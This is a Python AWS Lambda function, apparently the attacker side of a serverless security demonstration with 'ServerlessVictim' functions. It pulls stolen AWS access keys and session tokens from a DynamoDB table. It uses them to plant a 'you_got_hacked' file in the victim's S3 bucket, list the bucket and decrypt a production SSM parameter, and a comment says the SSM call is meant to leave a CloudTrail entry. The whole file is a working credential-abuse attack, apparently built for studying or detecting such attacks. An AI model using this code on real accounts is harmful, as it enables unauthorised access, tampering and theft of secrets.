import boto3
from boto3.dynamodb.conditions import Key

dynamodb = boto3.resource('dynamodb')
table = dynamodb.Table('access_keys')

def main(event, context):

    function_name = event.get('function_name', 'victim_byoc')

    response = table.query(
        KeyConditionExpression= Key("AWS_LAMBDA_FUNCTION_NAME").eq(f"ServerlessVictim-dev-{function_name}")
    )

    attack_client = boto3.client(
        's3',
        aws_access_key_id=response['Items'][0]['AWS_ACCESS_KEY_ID'],
        aws_secret_access_key=response['Items'][0]['AWS_SECRET_ACCESS_KEY'],
        aws_session_token=response['Items'][0]['AWS_SESSION_TOKEN']
    )

    attack_client.put_object(
            Bucket=response['Items'][0]['bucket_name'],
            Body="And that man comes on the radio".encode('utf-8'),
            Key=f"you_got_hacked_{function_name}.txt"
        )

    bucket_objects = attack_client.list_objects_v2(
        Bucket=response['Items'][0]['bucket_name']
    )

    # Get Parameter to put a entry into cloudtrail
    ssm_client = boto3.client(
        'ssm',
        aws_access_key_id=response['Items'][0]['AWS_ACCESS_KEY_ID'],
        aws_secret_access_key=response['Items'][0]['AWS_SECRET_ACCESS_KEY'],
        aws_session_token=response['Items'][0]['AWS_SESSION_TOKEN']
    )

    param = ssm_client.get_parameter(
        Name='/production/variable/foo',
        WithDecryption=True,
    )

    return [item['Key'] for item in bucket_objects['Contents']]